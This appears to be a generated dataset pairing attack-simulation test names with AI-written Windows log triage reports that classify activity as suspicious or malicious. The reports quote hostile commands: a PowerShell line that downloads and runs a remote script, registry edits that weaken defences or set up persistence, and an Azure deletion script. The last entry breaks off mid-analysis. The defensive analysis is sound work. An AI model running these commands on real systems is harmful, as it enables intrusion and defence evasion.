Disable Windows Prefetch Through Registry,"Here's the analysis of the provided logs:

### System Log Analysis
1. **Event ID 24, 1, and 35** - These events pertain to time changes and synchronization via `svchost.exe` and `time.windows.com`. The timestamps and services involved appear to be standard Windows time synchronization activities and are typically benign.

### Sysmon Log Analysis
1. **Events Detailing svchost.exe, wevtutil.exe, and conhost.exe** - The execution of `svchost.exe` under the NT AUTHORITY account and various instances of `wevtutil.exe` and `conhost.exe` under the `SERVER002\admin_test` account. The usage of `wevtutil.exe` for event log management and `conhost.exe` for managing console windows, in itself, is not inherently suspicious. However, the frequency and pattern of uses (e.g., wevtutil executed multiple times in quick succession) warrant a closer look. It could potentially indicate log clearing or manipulation attempts, typical in malicious scenarios.

2. **Execution of cmd.exe** - The particular command `cmd.exe /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"" /v ""EnablePrefetcher"" /t REG_DWORD /d 0 /f` is used to disable the prefetch feature in Windows. While not directly malicious, such changes can be employed during malware activities to evade detection.

3. **Execution of Hostname.exe and whoami.exe** - These utilities are often used for network and user information enumeration. They can be benign if used by legitimate administrators or scripts but could also indicate reconnaissance if used without appropriate context or during unusual operational times.

### Security Log Analysis
- **Event ID 4616** - These entries relate to time changes and indicate the system's LOCAL SERVICE account executing the change. This is typical during system time synchronization processes.

### Application Log Analysis
- **Software Protection Service (SPP)** - Event ID 16384 relates to the regular operation of the Software Protection Platform, commonly seen on Windows systems, with no immediate indicators of misuse.

### Conclusion
After reviewing the logs, the key areas of concern are the frequent invocations of `wevtutil.exe`, `conhost.exe`, and the registry modification via `cmd.exe`. The context and users involved could place these actions in a suspicious light, especially if they occur without explanation or a documented change request.

### Resolution
Based on the information:

- **Resolution:** **SUSPICIOUS**

### Guidance
1. **Further Investigation:** Perform a deeper analysis into the user activity of `SERVER002\admin_test` and any potential automated scripts running under that account. Investigating the source of the commands and actions can provide insight into whether they were authorized or maliciously executed.

2. **Monitor and Review:** Set up alerts for similar suspicious patterns such as frequent log management activity (`wevtutil.exe`) or registry changes via command line (`cmd.exe`).

3. **Review Logs:** Check for any additional logs or evidence of concurrent or sequential activities that may further illuminate the intent behind these actions.

In summary, while there is no definitive malicious activity evidenced, the patterns reflect potential misuse or setup actions that require further exploration to ascertain intent and impact."
Rundll32 syssetup.dll Execution,"### Analysis:

The provided event logs from the Sysmon source indicate multiple processes being started nearly simultaneously. The actions recorded are predominantly initiated by the user `SERVER002\admin_test`, which raises concerns due to the type and sequence of executed commands.

1. **Process Executions**:
   - The logs show frequent execution patterns involving `powershell.exe`, `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `rundll32.exe`.
   - `rundll32.exe` is used with the command to execute `syssetup.dll` which is uncommon and can be malicious, as it is often abused for executing arbitrary commands.
   - The presence of `cmd.exe` being used to execute scripts with paths pointing to temporary directories (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\src\\data.011_DefaultInstall.inf`) is suspicious. This behavior could indicate a script or an installer being executed stealthily.
   - Utilization of `powershell.exe` without any command line arguments is also indicative of potential reconnaissance or scripting automation.

2. **Execution Context and User Privilege**:
   - Most processes are executed under a high integrity level status meaning they are running with elevated privileges.
   - The primary user initiating these processes is `SERVER002\admin_test`, suggesting internal access is involved, which can imply compromised credentials or misuse of legitimate access.
   
3. **Indicators of Potential Malicious Activity**:
   - The use of system utilities like `whoami.exe`, and `hostname.exe` is commonly associated with reconnaissance activity typical of an attacker gathering system information.
   - The sudden burst of these activities indicates possible automation, potentially indicating script-based attacks.

### Threat Assessment:

Overall, the pattern of activities observed in these logs, particularly the invocation of `rundll32.exe` and `cmd.exe` in conjunction with high-integrity level processes under a single user's operation during a short time, strongly suggests potentially malicious conduct.

### Guidance and Resolution:

Given this analysis, the logs should be classified as **SUSPICIOUS** due to unusual behavior that warrants further investigation. This needs more scrutiny to affirm if these processes were legitimately executed for administrative purposes or are indicative of a security compromise.

**Action Points:**
1. Validate the authenticity of user `admin_test` activities. Check corresponding AD/server logs for any recent changes.
2. Perform a forensic analysis by tracking any associated network activity around these timestamps.
3. Use threat intelligence to check the payload linked with `rundll32.exe` and validate if `data.011_DefaultInstall.inf` matches known malicious signatures.
4. Consider restricting the execution of `rundll32.exe` from temp directories and evaluate enhanced monitoring for such execution patterns.

**Conclusion**: The activity detailed in the Sysmon logs is suspicious and merits additional investigation to append or rule out malicious intent."
Modify UseTPMKeyPIN Registry entry,"### Detailed Analysis of the Logs

Upon thorough examination of the provided logs, the following observations have been made:

#### Security Log
1. **Event ID 4616**: This event corresponds to a security audit indicating a change in the system time. The `LOCAL SERVICE` under `NT AUTHORITY` made time adjustments which can be caused by legitimate actions such as time synchronization with a time server. This action is shown twice with the `ProcessName` as `C:\Windows\System32\svchost.exe`. 

#### Application Log
1. **edgeupdate**: The log indicates the service stopped. Stopping of update services could be normal if it coincides with a system shutdown or restart pattern, and if there are no subsequent service start failures.

#### System Log
1. **Kernel-General (Event IDs 24 and 1)**: Reflects changes in system time. Correlates with security logs showing time being set back by a few seconds, which could be routine based on network time synchronization.
2. **Time-Service (Event ID 35)**: Indicates time synchronization with `time.windows.com`, which is typical for ensuring accurate timekeeping.

#### Sysmon Log
1. **Microsoft Edge Update Activity**: Multiple events (Event ID 1 and 5) indicate the execution of `MicrosoftEdgeUpdate.exe` and related components, including registration processes. These activities are consistent with typical software update processes.
   
2. **Execution of CMD and reg.exe**: A suspicious entry is found in the execution of `cmd.exe` with arguments modifying registry keys related to BitLocker (`HKLM\SOFTWARE\Policies\Microsoft\FVE`). This behavior can usually hint at system configuration changes or potential setups for persistence mechanisms, albeit not clear malicious activity.

3. **Multiple wevtutil.exe and conhost.exe Executions**: These processes are seen repeatedly executed by `admin_test`, suggesting potential administrative task scripting but requires context for legitimacy.

#### Summary and Resolution

- **Suspicious Activity**: The execution of `cmd.exe` to change registry settings related to BitLocker using elevated privileges stands out. This might indicate an administrative script or potentially unauthorized system configuration changes. Further investigation into why `admin_test` was performing this operation and if it is compliant with internal IT policies is necessary.

- **No Indicator of Malicious Activity**: Other logged activities such as time synchronization, svchost.exe operations, and Microsoft Edge Update logs align with expected system behavior.

### Final Resolution: SUSPICIOUS

While most activity observed in the logs appears benign or typical, the registry modification through `cmd.exe` warrants further investigation to ensure it aligns with authorized administrative practices and to rule out any misuse. Recommend following up with the system administrator or the account owner to validate the legitimacy of these actions, and potentially review related policies or changes scheduled around the log timestamps."
MSBuild Bypass Using Inline Tasks (VB),"Based on the provided Windows event logs, let's perform a detailed analysis to evaluate and determine any suspicious or potentially malicious activities.

### Summary of Findings:

**1. PowerShell Executions:**
   - The logs show a PowerShell execution by the user `SERVER002\admin_test`. PowerShell can be a powerful tool often used for legitimate administrative tasks, but it is also commonly used by attackers for script-based attacks. The absence of command-line parameters could be viewed as suspect, but there's no direct evidence of malicious use in the logs provided.

**2. Wevtutil.exe Executions:**
   - There are multiple instances of `wevtutil.exe` being executed. This tool is commonly used to manage and export Windows event logs. While this is not inherently malicious, its use in combination with other suspicious activities might indicate log tampering or a method to cover tracks if used with specific parameters.

**3. Execution of MSBuild.exe:**
   - There's an execution of `msbuild.exe` with `vb.xml` as a parameter. MSBuild can be used to execute code by loading malicious XML files. Given its presence in a temporary directory, this could be suspicious, especially if it coincides with unexpected behavior on the host.

**4. System Integrity Tools:**
   - Tools like `HOSTNAME.EXE`, `whoami.exe`, `conhost.exe`, and `cmd.exe` are commonly used for system information gathering and normal operations. The context does not indicate illicit use.

**5. Software Updates:**
   - Numerous instances of Microsoft Edge Update processes were observed. These relate to system maintenance processes and do not directly indicate malicious activity.

**6. High-level Privileges:**
   - The logs show SYSTEM processes with various privileges being accessed multiple times around the same periods as the suspicious activities. SYSTEM privileges are typically used for normal operations on a server.

**7. Security Events:**
   - Logon ID `""0x3E7""` is indicative of privileged logins. The presence of SYSTEM privilege escalation events (Event ID 4672) indicates that SYSTEM level operations were performed, but this could be typical depending on admin scripts or backup processes.
   
### Assessment:
After evaluating all logs and corresponding events, here's the concise assessment of the potential risks:

- **Suspicious Use of MSBuild and Powershell:** The execution of `msbuild.exe` through `cmd.exe` along with PowerShell activity deserves further scrutiny. Execution of build commands from a TEMP directory with potential compilation files (like `vb.xml`) can suggest payload execution using MSBuild, a known tactic for living-off-the-land (LotL) attacks.

- **Log Management Activity:** The frequent use of `wevtutil.exe` could suggest attempts to manage or clear logs. This needs further verification against expected activity to ascertain its legitimacy.

### Resolution:
Based on the evaluation, the resolution for these logs is categorized as **SUSPICIOUS**. The activities observed, especially around `msbuild.exe`, `powershell.exe` and `wevtutil.exe`, suggest there might be potentially unintended operations that require further, manual investigation to rule out any unauthorized actions or potential compromise.

### Guidance on How to Proceed:
1. **Conduct a Follow-up Investigation:**
   - Directly query the user `SERVER002\admin_test` activity timeline and correlate with expected tasks or administrative duties.
   - Examine the context and content of the temporary files (`vb.xml`) and any compiled artifacts they might have created.
   - Confirm whether the usage of `wevtutil.exe` matches typical patterns for log rotation or backup scripts.

2. **Ensure Access Logs:**
   - Securely maintain any access logs and further investigate the context for any other SYSTEM privilege operations.

3. **Review Security Policies:**
   - Verify security policies and controls in place for script execution (PowerShell, MSBuild).
   - Establish alerts for known suspicious behaviors, including activities around `msbuild.exe` from non-system directories.

By following these guidelines, the organization can effectively mitigate risks and strengthen its security posture."
Disable Windows Shutdown Button,"After analyzing the provided Windows event logs, here's a detailed breakdown of observations concerning the observed activities:

### Suspicious or Anomalous Behavior:
1. **Time Change Events (Event ID: 4616):** 
   - The series of logs indicate a time change on `Server002`. Time manipulation can sometimes be leveraged by attackers to cover tracks. However, they might also occur due to legitimate system or service operations (e.g., time synchronization).
   - The time was adjusted back by a small amount, which could suggest a potential replay attack or an attempt to manipulate time-sensitive operations, though this alone isn't decisive evidence of malicious intent.

2. **Privileged Logon Event (Event ID: 4672 & 4624):**
   - A user `admin_test` logs in with several high privileges including `SeDebugPrivilege`, `SeBackupPrivilege`, and others. This could indicate normal administrative activity, but combined with other suspicious activity it could indicate potential escalation or abuse of privileges.

3. **Process Execution Events with Elevated Privileges:**
   - The execution of `cmd.exe` with a command related to modifying registry keys (`shutdownwithoutlogon`) by `admin_test` (Sysmon Event ID: 1) is noteworthy. While this action could be legitimate — perhaps a configuration change — it's unusual if not accounted for in change logs or not requested by an admin.
   - The command is executed from a `TEMP` directory which is often seen in malicious scripts or batch files executed by malware.

4. **Frequent Execution of System Utilities (Sysmon Event ID: 5):**
   - The repeated invocation of `wevtutil.exe`, `whoami.exe`, and `cmd.exe` within a short timeframe under `admin_test` suggests the user might be trying to enumerate or alter system configurations for further actions, which might be part of a reconnaissance step in a malicious campaign.

### Indicators of Malicious Activity or Compromise:
- The chain of events involving privileged commands, the adjustment of system time, execution of essential Windows tools (`wevtutil`, `reg.exe`), and significant privileges associated with the user `admin_test` aligns with specific tactics often used in cyber-attacks:
  1. **Privilege Escalation:** Use of multiple high-level privileges by `admin_test`.
  2. **Defense Evasion:** Possible time manipulation and direct registry manipulation indicate an attempt to cover tracks.
  3. **Execution:** Command execution altering system settings through `cmd.exe` and `reg.exe`.

### Assessment of the Logs:
The activities recorded, particularly the registry changes and time manipulation, when combined with privileged access, suggest potential malicious behavior. Although individual actions might seem benign, their combination and context lean towards a non-standard operation that could indicate an unauthorized or malicious intent.

### Resolution:
- **SUSPICIOUS**: While the logs don't irrefutably prove malicious activity, the pattern of events is unusual enough to warrant further investigation. Consider confirming with administrative personnel if such changes were authorized or necessary. Review any associated user activity around the same timestamp for external corroboration of non-malicious purpose.

### Guidance:
1. **Verification:** Verify with relevant admin teams whether the observed activities were planned or executed as part of maintenance.
2. **Access Review:** Check user `admin_test` activities and other accesses around these events. Compare with access controls and least privilege policies.
3. **Monitor:** Enable additional monitoring to capture further potential malicious attempts if not already in place.
4. **Audit Trail:** Review historical logs around these timestamps for any related or preceding suspicious activities."
Enable Proxy Settings,"Upon reviewing the provided event logs across different channels - PowerShell, Security, Application, System, and Sysmon logs, let's summarize key points and assess for any suspicious or malicious activities:

### Key Observations:

#### Security and System Logs:
1. **Time Change Events:**
   - Multiple time change events (EventID 4616) are logged in both the Security and System logs. These reflect legitimate Windows time synchronization activities. The presence of svchost.exe is consistent with normal system operation processes. 

#### Sysmon Logs:
1. **Process Execution:**
   - There are multiple signs of process creation involving standard Windows utilities (such as wevtutil.exe, conhost.exe, HOSTNAME.EXE, whoami.exe, cmd.exe, and reg.exe). These are normal tools, but in certain scenarios, they can be used for malicious activities:
     - `cmd.exe` was involved in adding a registry key to enable a proxy (`reg add ""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"" /v ProxyEnable /t REG_DWORD /d 1 /f`). This could be suspicious if not expected, as it indicates a change in internet settings that might redirect traffic or monitor connections. 
     - `whoami.exe` checking user identity, could correlate with privilege escalation, but no direct evidence of privilege escalation is identified within the logs provided.

2. **Execution by admin_test:**
   - Many processes are executed by a user account named `admin_test` with high integrity level, indicating administrative rights. Consistent use of admin-level actions is normal for legitimate admin users but is concerning if unintentional or unexpected.

### Assessment:
- The event logs largely contain operations from administrative users performing routine commands or maintenance tasks. Except for the registry modification via `reg.exe`, which deserves further scrutiny due to the potential implications on internet settings, most other events are benign.
- There are no definitive indicators of malware execution or compromise such as the execution of known malicious payloads, encoding, or data exfiltration attempts within the current logs.

### Resolution:
- **SUSPICIOUS**: The registry change to enable a proxy setting using high-integrity processes should be investigated further. Check if these operations by `admin_test` were authorized and correlate with legitimate administrative tasks. Review any network changes following the proxy setting modification for anomalies.
- **Actionable Steps:**
  - Verify the `admin_test` account activity legitimacy.
  - Cross-reference the registry change with change management logs or IT tickets.
  - Ensure no unauthorized proxy applications or settings have been configured.
  - Monitor subsequent network traffic for unusual patterns possibly linked to this change.

This resolution ensures the suspicious activity's legitimacy is confirmed or mitigated accordingly."
WinPwn - UAC Magic,"Upon reviewing the provided Windows event logs, there are several indicators that suggest potential malicious activity, particularly within the PowerShell logs. Here is a detailed analysis:

1. **PowerShell Logs:**
   - The events in the PowerShell log suggest that a script was executed via PowerShell using a suspicious command line:
     ```
     powershell.exe & {$script_repo='https://raw.githubusercontent.com/script'
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')}
     ```
   - The use of `iex(new-object net.webclient).downloadstring(...)` is a well-known pattern for executing scripts from an external source, which is often used in PowerShell-based attacks.
   - The fact that the script is being downloaded and executed from a public repository without any information about its safety or legitimacy makes it highly suspicious and potentially malicious.

2. **Security Logs:**
   - Event ID 4624 indicates a network logon using NTLM authentication (LogonType 3) by the user ""admin_test"". This in itself is not unusual but could be part of initialization for further actions.
   - Event ID 4672 granted the user ""admin_test"" special privileges such as ""SeDebugPrivilege"", which may be used for privilege escalation and is concerning, especially if it's not a common procedure on this server.

3. **Sysmon Logs:**
   - Multiple processes were spawned during the same timeframe, including standard Windows utilities such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe`. Combined with the PowerShell activity, this may suggest attempts at reconnaissance or system modifications, although these actions alone are not definitive of malicious activity without further context.
   - The running of `whoami.exe` aligns with typical reconnaissance actions to enumerate privileges and users.

4. **Correlation with Application Logs:**
   - Windows Defender was reported as active, yet there’s no mention of it blocking any processes during the suspicious PowerShell execution. This could indicate either a missing detection, a false negative, or possibly a heavily obfuscated/persistent script that evaded detection.

**Conclusion and Resolution:**
Based on the analysis, the activities recorded in the logs present indicators that suggest probable malicious activity due to:
- The downloading and execution of a remote script via PowerShell.
- The execution of shell and script commands possibly aimed at privilege escalation or further exploitation.

Therefore, the resolution for this activity is:
- **MALICIOUS** - The logs contain activity that strongly indicates malicious intent.

**Guidance:**
- Immediate actions should include isolating the affected host to prevent further network access or spread of potential compromise.
- Conduct deeper forensic analysis on the host to determine the scope and impact.
- Review firewall and security policies to prevent such executions in the future and ensure all endpoints have up-to-date security measures and auditing capabilities.
- Consider contacting any external authorities if sensitive data might have been compromised."
Delete TeamViewer Log Files,"### Analysis of Logs

**Suspicious or Anomalous Behavior:**

1. **PowerShell Activity:**
   - The PowerShell logs indicate a sequence of events where a log file (`TeamViewer_54.log`) is created and then immediately deleted in the temporary directory using PowerShell. This behavior can be considered suspicious as it might indicate an attempt to execute scripts and clean up evidence of the execution. However, without further context, the activity in isolation isn't definitively malicious but warrants a closer look.

2. **Time Changes:**
   - The logs indicate a time change event in the system logs and security logs. While there can be legitimate reasons for time changes, unauthorized or repeated changes might be indicative of an attacker attempting to manipulate time for various illicit purposes like backdating malware or logs.

3. **Process Execution and Integrity Level:**
   - The Sysmon logs reveal several executions of system binaries (`whoami.exe`, `conhost.exe`, `wevtutil.exe`, etc.) under a high integrity level by the user `SERVER002\admin_test`. While these are common system processes, the pattern and integrity level should be considered alongside administrative activities. The frequent execution of `whoami.exe` might be for enumerating user privileges, which could be benign in a troubleshooting context but suspicious if unsanctioned.

4. **Edge Update Processes:**
   - There are multiple events related to `MicrosoftEdgeUpdate.exe`, which is typical for updating Microsoft Edge. The appearance of these in logs is usually benign but reviewing this in the context of any anomalous installations or connections may be necessary if not expected.

**Assessment of Malicious Activity:**

- The PowerShell activity is the main point of interest due to the logging and deletion actions typically associated with obfuscation tactics seen in malicious scripts.
- While the observed system process activities can occur during legitimate usage, the frequency and ties to an admin-level user alongside the system time changes could warrant further examination for potential indicators of compromise.

### Threats/Risks Identified:

- **Obfuscation and Cleanup:** PowerShell activity indicates possible script execution and subsequent evidence removal.
- **Privileged Activity:** Processes running with high integrity levels could suggest elevated permissions execution, potentially aligning with privilege escalation attempts.

### Guidance:

1. **Deep Dive Investigation:**
   - The PowerShell logs require examination of the context around logs being created and removed. Investigate any additional logs or system changes that correlate to this activity.
   - Review user `admin_test` activities within the broader timeframe surrounding these events for suspicious activity like logins, privilege escalations and access to sensitive resources.

2. **Security Policy Review:**
   - Ensure proper monitoring and alerting for PowerShell script executions, especially those that involve file deletions.
   - Tighten controls and oversight on privilege usage and integrity levels of executed processes.

3. **Time Changes:**
   - Assess why the time changes occurred. If originating from unauthorized sources, address potential vulnerabilities allowing time manipulation.

### Resolution

Based on the investigation, the resolution for the logs is:

- **SUSPICIOUS** - The logs contain activity such as PowerShell scripting and repeated administrative process usage that do not conclusively indicate malicious intent but necessitate further investigation to rule out potential compromise."
Abusing MyComputer Disk Backup Path for Persistence,"Here is a detailed analysis of the provided event logs, focusing on detecting suspicious or malicious activities.

### Observation & Analysis

1. **Sysmon Logs:**
   - `Process Executions`: Multiple legitimate system processes such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe` are executed by the `admin_test` user. These actions are generally benign unless accompained by anomalous behavior, which is not evident here.
   - `Command Line Usage`: The `cmd.exe` command line included a registry modification(`reg add`) to set a registry path to `notepad.exe`, which could indicate persistence or autostart configuration potentially set to avoid detection.

2. **Anomalous Time Reset:**
   - There are logs indicating a reset of the system time. This can be an indicator of malicious activity aiming to tamper with event logs, making it harder to trace back actions. The `Security` and `System` logs show a time change initiated by `svchost.exe`, which and it's unusual for legitimate activity unless part of system time synchronization and adjustments.

3. **Registry Modifications**: 
   - The alteration within `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath` using `reg.exe` with `notepad.exe` could be classified as suspicious. This unconventional path and its modification are often used to establish persistent backdoors or execute payloads, considering it's carried out by `cmd.exe` and substantiated by its parent process.

4. **EdgeUpdate Processes**: 
   - Numerous `Microsoft Edge Update` processes are seen being executed as `NT AUTHORITY\SYSTEM`. These entries seem aligned with the expected behavior of legitimate system updates for the Microsoft Edge browser. However, the frequency and timing during this narrow timeframe raise mild concern over update tampering, although no evidence conclusively points to this.

5. **User and Process Consistency**: 
   - Most activities (especially suspicious ones) occur under the user `SERVER002\admin_test`, following a predictable pattern with no evident privilege escalation or disparate activity typically indicative of compromise.

### Conclusion

Taking a holistic view of these activities, while certain elements such as the registry changes and time adjustments raise a red flag, there is insufficient evidence within provided logs to confirm outright malicious intent. However, they warrant further investigation.

### Resolution: **SUSPICIOUS**

Recommendations for further action:
- **Review Change Management**: Confirm changes to system time and registry were authorized.
- **Malware Analysis**: Conduct system scans for anomalies or executables related to the suspicious registry path.
- **Audit Admin Actions**: Interview and review actions under `admin_test` for context on known supported activities.
- **Enable Additional Logging**: Enhance logging levels for detailed auditing of registry and system modifications.

This assessment reflects the need for deeper exploration to discern any underlying threats that may not be overtly evident in the initial logs.
"
Delete Microsoft Defender ASR Rules - GPO,"Upon reviewing the provided Windows event logs, here is a detailed analysis and assessment of the situation:

### 1. **Time Synchronization Events:**
The security logs contain multiple event ID 4616 logs related to system time changes by the `svchost.exe` process running under the `LOCAL SERVICE` account. These events indicate regular and expected behavior where system time synchronization is occurring. Additionally, the system logs support this finding with event ID 1 and they emanate from synchronization with `time.windows.com` (via NTP), which is typical for maintaining accurate time settings.

### 2. **Process Execution:**
- The Sysmon logs exhibit multiple instances of normal Windows processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` being executed by the `SERVER002\admin_test` user. These processes do not appear unusual on their own and align with typical administrative or user tasks.

### 3. **PowerShell Script Execution:**
A Powershell script was executed by `SERVER002\admin_test` which interacts with the Windows Defender Advanced Threat Protection (ATP) registry. The script checks for a specific registry path related to Windows Defender Exploit Guard ASR rules, creates a registry entry, sets its value, and then subsequently removes it. While this activity could be part of legitimate patching or testing operations, it is atypical to access and modify registry paths related to exploit guard rules.

### 4. **Security and Application Logs:**
The application logs do not indicate any particular anomalies or malicious actions during the time window examined.

### **Assessment:**
The primary point of concern lies in the Powershell activity that involves creating and then removing a Windows Defender Exploit Guard ASR rule in the registry. This could potentially be a benign action driven by administrative maintenance or security testing, but it could also be indicative of an attempt to bypass security policies temporarily.

### **Resolution:**
- **Resolution:** **SUSPICIOUS**
- **Reasoning:** The operation involving the modification of Windows Defender Exploit Guard ASR rules is a notable event that deviates from normal activity patterns and requires further investigation. Although it may be benign, the context in which it is executed, especially if unauthorized or unexpected, merits careful attention.

### **Guidance on How to Proceed:**
1. **Confirm Legitimacy:** Verify with relevant administration and security personnel to determine if there were authorized changes or tests involving ASR rules or any scripts executed on the server at that time.
   
2. **Review User Activities:** Check for other indicators of misuse or unauthorized activities performed by the user `SERVER002\admin_test`, such as unusual login attempts or further registry operations.

3. **Inspect System Configuration Changes:** Investigate the timeline for any unintended system configuration changes or potential attempts to circumvent security policies.

4. **Conduct Threat Hunting:** Employ more comprehensive threat hunting measures such as network traffic analysis or deeper forensic examinations on the endpoint to uncover hidden malicious activities, especially if unauthorized system access or potential compromise is suspected.

5. **Policy Review:** Assess and potentially strengthen security policies regarding access to and modification of registry entries associated with critical security configurations like Windows Defender Exploit Guard."
Tamper with Windows Defender Registry - Powershell,"### Detailed Analysis of the Logs

**Suspicious or Malicious Activity Observed:**

1. **PowerShell Activity:**
   - A series of commands were executed in PowerShell to disable various Microsoft Windows Defender settings, including anti-virus, anti-spyware, real-time protection, tamper protection, and other security features. This activity suggests an attempt to weaken the system's defenses, which is a common tactic used by attackers to maintain persistence and avoid detection.
   - The command specifically targets critical security configurations, reducing the overall security posture of the system significantly.

2. **Usage of Built-in Windows Tools:**
   - The execution of legitimate Windows binaries such as `svchost.exe`, `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` under an admin account. While these tools are standard, their use, particularly in rapid succession and context, might indicate attempts to perform system reconnaissance or cover tracks. However, without specific malicious arguments or actions, they are not inherently harmful on their own.

3. **Timing and Sequence:**
   - There is a suspicious temporal correlation between the PowerShell activity aimed at disabling security and the subsequent logged processes. This sequence could suggest steps in an attack chain where security measures are disabled before carrying out more intrusive or reconnaissance actions.

4. **Edge Update Activity:**
   - Despite numerous logs related to Microsoft Edge update processes, they align with legitimate software updates and do not show explicitly malicious parameters or activities inherent in the logs reviewed.

### Assessment of the Situation:

The execution of PowerShell commands to disable Windows Defender's comprehensive security features is an extremely serious and definitive indicator of malicious intent, surpassing typical administrative misconfigurations or benign scripting. These PowerShell commands pose a significant security risk, as they disable the host's core defense mechanisms.

### Resolution:

- **MALICIOUS** - The logs unequivocally indicate malicious activity due to the PowerShell commands designed to disable Windows security features. Such actions are a classic indication of a compromise designed to weaken the system and evade detection.

### Guidance on How to Proceed:

4. **Review and Strengthen Security Protocols:**
   - **Audit and Monitoring**: Implement enhanced logging and monitoring to detect similar future incidents proactively.
   - **Patch Management**: Ensure all systems, software, and security measures are up-to-date with the latest patches. 

By addressing these areas, the organization can mitigate the current threat and reduce the risk of future security breaches."
ESXi - Disable Firewall via Esxcli,"Upon reviewing the provided Windows event logs, I have identified certain elements of interest, but let's break it down methodically:

1. **Usage of PowerShell**:
   - An instance of `powershell.exe` was executed under the user ""admin_test"". While the usage of PowerShell is common in Windows environments, it has robust and versatile scripting capabilities which can be exploited by malicious actors. However, there needs to be further context or supporting evidence of specific malicious behavior to flag it as a threat.

2. **Wevtutil.exe and conhost.exe**:
   - The usage of `wevtutil.exe` and `conhost.exe` repeatedly under the ""admin_test"" account can be part of legitimate administrative tasks, as `wevtutil.exe` is used to manage event logs, and `conhost.exe` acts as a console window handler. Without any suspicious command-line arguments, these seem benign.

3. **Whoami.exe and Hostname.exe**:
   - The execution of `whoami.exe` and `hostname.exe` doesn't inherently suggest malicious activity. These are common utilities used to retrieve information about the user and system. Their use in scripts or tasks by administrators is not unusual.

4. **Cmd.exe and Plink.exe Execution**:
   - The execution of `cmd.exe` with a command-line argument that includes `plink.exe` is of significant concern. `Plink.exe`, part of the PuTTY suite, is used for command-line SSH sessions. The fact that it is being used with what appears to be an effort to connect to `file.local` as root with a password file is suspicious, especially considering it attempts to disable firewall on a remote system (`esxi_disable_firewall.txt`). This suggests possible unauthorized network access or preparation for further compromise.

5. **Microsoft Edge Update Activity**:
   - A series of `MicrosoftEdgeUpdate.exe` and associated files executed as `NT AUTHORITY\SYSTEM` appear in quick succession. This activity might indicate a legitimate update process. However, given the meticulous crafted command lines and numerous service executions, it's consistent with automated software update processes and doesn't immediately raise flags for malicious activity.

6. **Application Log activity:**
   - Logs reflect the stopping of a service related to `edgeupdate` without contextual unusual behavior suggesting an anomaly.

In summary, the most glaringly suspicious activity is the use of `cmd.exe` to execute `plink.exe` for SSH actions that include disabling a firewall on what appears to be an external system. This type of activity warrants further investigation to confirm whether it was authorized or part of standard organizational policy.

**Resolution**: **SUSPICIOUS** - The presence of `plink.exe` with command-line actions potentially pointing to unauthorized network activities marks this for further investigation to ensure no malicious activity or misconfiguration is allowed to persist."
Msiexec.exe - Execute Local MSI file with an embedded EXE,"Upon analyzing the provided Windows event logs, here is a detailed analysis of the potentially suspicious activities observed:

1. **Execution of PowerShell and CMD**: The execution of `powershell.exe` and `cmd.exe` in close succession could be a typical operation, but in this context, it is vital to examine the use of these powerful command-line tools further to ensure that no malicious scripts or commands were executed. Specifically, `cmd.exe` was observed executing `msiexec.exe`, which could be benign but warrants further inquiry, especially since `msiexec.exe` is known to be used in software installation processes.

2. **Installation via MSI**: The logs reveal the installation process of a package named `file file Test Installer` via `msiexec.exe` from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`). While this could simply be a software installation or update, installing executables directly from a temporary directory without prior approval could be potentially suspicious.

3. **Presence of `.tmp` Files**: The process `C:\\Windows\\Installer\\MSIA30E.tmp` was executed, which could suggest the unapproved installation of a program or a potential file left over from an incomplete installment process that could be manipulated for malicious purposes.

4. **Integration with Edge Updater**: Processes related to Microsoft Edge Update operations are visible, initiated by `MicrosoftEdgeUpdate.exe`. Legitimate updates often utilize such processes; however, runtime from temporaries (`.tmp` or undesignated directories) should be scrutinized.

5. **High Integrity Level of Commands**: All executed commands were run under a 'High' integrity level by the same user account `SERVER002\\admin_test`, suggesting that this user has elevated privileges, which could be leveraged further for operational needs or potential misuse.

### Assessment and Conclusion:

- **SUSPICIOUS**: The logs indeed contain a series of activities that warrant further investigation. While activities like software installation, usage of PowerShell and CMD, and Edge updates can occur during routine administrative and maintenance tasks, the context, origin, the specific use of temporary directories, and deployment of `.tmp` files demand a detailed review to rule out any unauthorized installations or attempts at privilege escalation.

### Guidance on How to Proceed:

1. **Verify the User Account Activities**: Examine historical login and access patterns for `SERVER002\\admin_test` to verify whether the observed activities align with regular behavior or an anomaly.

2. **Audit Installed Software**: Check the installation source and approval status for `file file Test Installer`, and identify any risk it might pose or alignment with corporate IT policies.

3. **Log Increased Scrutiny**: Scrutinize System Audit Logs and PowerShell script logs if available, for any unusual or unauthorized changes, configurations, or script execution.

4. **Implement Monitoring**: Temporarily increase system and log monitoring on `Server002` to alert any future installations or atypical process executions.

5. **File Integrity Checks**: Execute a file integrity check to ensure that no critical system files have been tampered with, focusing on those that were seen in event executions.

6. **Engage with Anti-Malware**: Run comprehensive system scans with updated anti-malware tools to check for any compromise traces.

Given these actions, further investigation can confirm whether these logs represent benign user actions or indicate a more significant issue at hand. Continuing with these steps will help in gaining clarity regarding the nature of these activities."
Azure - Eventhub Deletion,"To analyze the provided Windows event logs, I will focus on the key aspects that may indicate any suspicious or malicious activity, particularly looking for unusual process executions, command line activities, privilege escalation attempts, and anomalies in behavior.

### PowerShell Logs Analysis

The PowerShell logs indicate the execution of a script using `powershell.exe` on `Server002`. The command executed is:
```powershell
$secure_pwd = """" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList """", $secure_pwd
Connect-AzureAD -Credential $creds
Remove-AzEventHub -ResourceGroupName -Namespace -Name test_eventhub
```
#### Observations:
- **Empty Credentials:** The use of an empty string for the `ConvertTo-SecureString` with `-Force` to bypass the warning for using plain text is highly suspicious. Typically, credentials should not be scripted this way, especially leaving them effectively blank.
